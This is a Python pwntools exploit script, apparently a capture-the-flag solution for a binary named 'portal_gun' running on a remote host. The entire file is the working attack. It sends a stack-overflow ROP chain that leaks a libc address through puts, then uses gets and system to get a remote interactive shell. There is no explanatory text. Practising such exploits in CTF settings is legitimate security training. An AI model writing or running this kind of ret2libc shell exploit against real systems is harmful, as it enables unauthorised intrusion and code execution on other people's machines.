#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

# p = process('./portal_gun')
p = remote('60.250.197.227', '10002')
elf = ELF('./libc.so.6')
# pause()

# start = 0x4006fb
libc_start_main_offset = 0x21ab0

puts_plt = 0x400560
system_plt = 0x400570
gets_plt = 0x400580

pop_rdi = 0x4007a3

bss = 0x601500

payload = flat(
    cyclic(0x78),
    pop_rdi,
    0x600ff0,
    puts_plt,
    0x4006fb
)

p.sendlineafter('Where do you want to go?', payload)

p.recv()
elf.address = u64(p.recv(6) + '\0\0') - libc_start_main_offset

success(hex(elf.address))


payload = flat(
    cyclic(0x78),
    pop_rdi,
    bss,
    gets_plt,
    pop_rdi,
    bss,
    elf.sym.system
)

p.sendlineafter('Where do you want to go?', payload)


p.interactive()
p.close()
